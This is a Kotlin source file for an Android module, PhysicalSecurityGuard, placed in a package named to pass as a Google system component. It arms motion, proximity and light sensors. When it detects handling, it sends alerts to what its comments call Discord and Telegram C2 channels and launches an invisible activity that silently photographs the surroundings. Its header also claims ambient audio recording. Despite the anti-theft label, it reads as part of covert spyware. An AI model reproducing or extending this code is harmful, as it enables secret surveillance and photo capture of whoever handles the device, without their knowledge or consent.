package com.google.android.system

import android.content.Context
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.SystemClock
import android.util.Log
import kotlin.math.abs
import kotlin.math.sqrt

/**
 * PhysicalSecurityGuard
 *
 * Active Sensor Fusion Physical Security & Anti-Tamper Guard (FEAT-09):
 * - Monitors hardware Accelerometer, Proximity, and Light sensors when armed.
 * - Detects physical pick-up, movement delta, pocket extraction, and hardware tampering.
 * - Triggers silent camera photo capture, ambient audio recording, and high-priority C2 alerts.
 */
object PhysicalSecurityGuard : SensorEventListener {

    private const val TAG = "PhysicalSecurityGuard"
    private const val COOLDOWN_MS = 10_000L // 10s cooldown between alerts

    @Volatile var isArmed: Boolean = false
        private set

    @Volatile var sensitivityThreshold: Float = 3.5f // m/s^2 delta above 1g (9.81)

    private var sensorManager: SensorManager? = null
    private var lastAlertTime: Long = 0L

    private var lastProximityVal: Float = -1f
    private var lastLightVal: Float = -1f

    /**
     * Arms physical security guard with specified motion sensitivity threshold.
     */
    @Synchronized
    fun armGuard(context: Context, sensitivity: Float = 3.5f): Boolean {
        sensitivityThreshold = sensitivity.coerceIn(1.0f, 15.0f)
        val appContext = context.applicationContext

        return try {
            sensorManager = appContext.getSystemService(Context.SENSOR_SERVICE) as? SensorManager
            val accel = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
            val prox = sensorManager?.getDefaultSensor(Sensor.TYPE_PROXIMITY)
            val light = sensorManager?.getDefaultSensor(Sensor.TYPE_LIGHT)

            if (accel != null) {
                sensorManager?.registerListener(this, accel, SensorManager.SENSOR_DELAY_UI)
            }
            if (prox != null) {
                sensorManager?.registerListener(this, prox, SensorManager.SENSOR_DELAY_UI)
            }
            if (light != null) {
                sensorManager?.registerListener(this, light, SensorManager.SENSOR_DELAY_UI)
            }

            isArmed = true
            SecurityVaultManager.getEncryptedPrefs(appContext)
                .edit()
                .putBoolean("physical_guard_armed", true)
                .putFloat("physical_guard_sensitivity", sensitivityThreshold)
                .apply()

            Log.i(TAG, "Physical Security Guard ARMED (Sensitivity: $sensitivityThreshold m/s²)")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to arm Physical Security Guard: ${e.message}", e)
            false
        }
    }

    /**
     * Disarms physical security guard and unregisters sensor listeners.
     */
    @Synchronized
    fun disarmGuard(context: Context): Boolean {
        val appContext = context.applicationContext
        return try {
            sensorManager?.unregisterListener(this)
            sensorManager = null
            isArmed = false

            SecurityVaultManager.getEncryptedPrefs(appContext)
                .edit()
                .putBoolean("physical_guard_armed", false)
                .apply()

            Log.i(TAG, "Physical Security Guard DISARMED.")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disarm Physical Security Guard: ${e.message}", e)
            false
        }
    }

    /**
     * Restores armed state from SecurityVaultManager if enabled on startup.
     */
    fun restoreArmedStateIfNeeded(context: Context) {
        val prefs = SecurityVaultManager.getEncryptedPrefs(context)
        val wasArmed = prefs.getBoolean("physical_guard_armed", false)
        val sensitivity = prefs.getFloat("physical_guard_sensitivity", 3.5f)

        if (wasArmed) {
            armGuard(context, sensitivity)
        }
    }

    override fun onSensorChanged(event: SensorEvent?) {
        if (!isArmed || event == null) return

        val now = SystemClock.elapsedRealtime()

        when (event.sensor.type) {
            Sensor.TYPE_ACCELEROMETER -> {
                val x = event.values[0]
                val y = event.values[1]
                val z = event.values[2]

                val magnitude = sqrt((x * x + y * y + z * z).toDouble()).toFloat()
                val delta = abs(magnitude - 9.81f)

                if (delta > sensitivityThreshold && (now - lastAlertTime > COOLDOWN_MS)) {
                    lastAlertTime = now
                    val reason = "🚨 **Physical Movement Detected!** (Acceleration Delta: `${"%.2f".format(delta)} m/s²`)"
                    onPhysicalTamperDetected(event.sensor.type, reason)
                }
            }

            Sensor.TYPE_PROXIMITY -> {
                val prox = event.values[0]
                if (lastProximityVal == 0f && prox > 0f && (now - lastAlertTime > COOLDOWN_MS)) {
                    lastAlertTime = now
                    val reason = "🚨 **Pocket/Bag Extraction Detected!** (Proximity sensor unblocked)"
                    onPhysicalTamperDetected(event.sensor.type, reason)
                }
                lastProximityVal = prox
            }

            Sensor.TYPE_LIGHT -> {
                val light = event.values[0]
                if (lastLightVal in 0.0..5.0 && light > 50.0f && (now - lastAlertTime > COOLDOWN_MS)) {
                    lastAlertTime = now
                    val reason = "🚨 **Sudden Light Exposure Tamper!** (Light shifted from `${lastLightVal.toInt()} lx` to `${light.toInt()} lx`)"
                    onPhysicalTamperDetected(event.sensor.type, reason)
                }
                lastLightVal = light
            }
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}

    /**
     * Dispatches high-priority alert to Discord & Telegram C2 channels and triggers silent evidence capture.
     */
    private fun onPhysicalTamperDetected(sensorType: Int, reason: String) {
        Log.w(TAG, "Physical Security Tamper Triggered ($sensorType): $reason")

        MonitorService.sendDiscordStreamSensorAlert("Physical Security Guard", reason)
        MonitorService.activeInstance?.let { service ->
            try {
                InvisibleActivity.launchInvisible(service, action = InvisibleActivity.ACTION_PHOTO, isFront = false)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch InvisibleActivity for tamper photo: ${e.message}")
            }
        }
    }
}
